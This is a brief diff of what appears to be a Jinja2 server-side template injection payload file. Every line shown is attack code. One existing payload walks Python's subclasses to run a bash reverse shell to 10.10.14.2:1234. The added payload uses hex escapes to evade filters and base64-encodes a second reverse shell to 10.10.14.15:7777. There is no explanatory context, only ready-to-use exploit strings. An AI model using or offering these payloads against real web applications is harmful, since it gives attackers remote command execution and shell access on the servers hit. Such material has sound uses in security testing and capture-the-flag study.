@@ -1,3 +1,7 @@
 {% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in
 x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("bash -c
 'bash -i >& /dev/tcp/10.10.14.2/1234 0>&1'").read()}}{%endif%}{%endfor%}
+
+{% include
+request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuilt\x69\x6es\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")
+("\x5f\x5fimport\x5f\x5f")("os")|attr("popen")("echo YmFzaCAtYyAiYmFzaCAtaSAmPi9kZXYvdGNwLzEwLjEwLjE0LjE1Lzc3NzcgMD4mMSIK|base64 -d|bash")|attr("read")() %}
